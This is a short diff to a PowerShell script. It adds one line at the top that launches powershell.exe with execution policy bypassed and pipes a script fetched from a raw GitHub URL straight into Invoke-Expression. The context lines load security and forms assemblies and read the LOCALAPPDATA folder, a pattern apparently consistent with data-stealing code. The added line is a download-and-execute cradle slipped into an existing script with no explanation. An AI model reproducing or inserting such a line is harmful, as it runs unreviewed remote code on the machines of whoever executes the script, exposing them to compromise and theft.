@@ -1,3 +1,4 @@
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (IWR 'https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/seco.ps1' -UseBasicParsing)"
 Add-Type -AssemblyName System.Security
 Add-Type -AssemblyName System.Drawing,System.Windows.Forms
 $LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
